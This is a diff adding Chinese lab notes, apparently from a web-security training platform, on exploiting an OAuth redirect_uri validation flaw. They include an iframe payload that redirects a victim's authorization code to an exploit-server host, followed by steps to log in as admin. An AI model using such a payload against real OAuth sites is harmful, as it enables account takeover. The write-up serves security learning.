@@ -53,7 +53,30 @@
 
     三、使用社交媒体账号登录，得到admin权限    
 
-      
 
+ 第四关：
+    在这个实验中，使用第三方时候会有请求/auth?client_id=lfrdr5ypjfkv43i1ibweh&redirect_uri=
+    https://0aab0037033fc7e680d24eb50056001a.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email，
+    之后，完成第三方登录验证就会重定向至redirctURL参数的路径并携带code值
+    
+    这很正常，但是这个第三方没有验证client_id和redirect_url是否是同一个域名，导致我们可以修改redirect_url为我们的恶意网站地址，使得管理员点击链接后会向我们的恶意网站发送get请求，并且参数为code，
+    得到管理员code即可登录，因为他没有code_verifier和 code_challenge来校验这个code是否属于我的
+
+    第一步：
+        抓包，得到地址：
+            <img width="482" height="281" alt="image" src="https://github.com/user-attachments/assets/d11d6700-ba80-4a69-9299-80469b097c59" />
+        将重定向url改为自己的恶意网站地址
+
+    第二步：
+        构造恶意网站：
+            <iframe src="https://oauth-0a97007e032cc7b480fd4cd502f700f9.oauth-server.net/auth?client_id=lfrdr5ypjfkv43i1ibweh&redirect_uri=
+            https://exploit-0a1100f60334c7ca80474df701610022.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
+
+    第三步：发送至受害者，并查看日志，得到code：
+        <img width="852" height="496" alt="image" src="https://github.com/user-attachments/assets/f27599eb-a11e-470d-b9e0-798a051aeb6f" />
+
+    第四步：使用某个code登录admin成功
+    
+           
     
 
